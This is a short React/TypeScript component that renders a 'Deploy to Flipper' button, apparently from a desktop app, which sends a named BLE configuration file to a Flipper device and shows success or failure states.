function DeployButton({ config, name }: { config: string; name: string }) {
  const [deploying, setDeploying] = useState(false)
  const [result, setResult] = useState<'success' | 'error' | null>(null)
  const handleDeploy = async () => {
    setDeploying(true)
    try {
      const res = await window.icarus.deployPayload('ble', `${name}.txt`, config)
      setResult(res.success ? 'success' : 'error')
    } catch {
      setResult('error')
    }
    setDeploying(false)
    setTimeout(() => setResult(null), 2000)
  }
  return (
    <button onClick={handleDeploy} disabled={deploying} className={goldButtonGlow + ' flex items-center gap-1.5'}>
      <Send className="w-3 h-3" />
      {deploying ? 'DEPLOYING...' : result === 'success' ? 'DEPLOYED' : result === 'error' ? 'FAILED' : 'DEPLOY TO FLIPPER'}
    </button>
  )
}

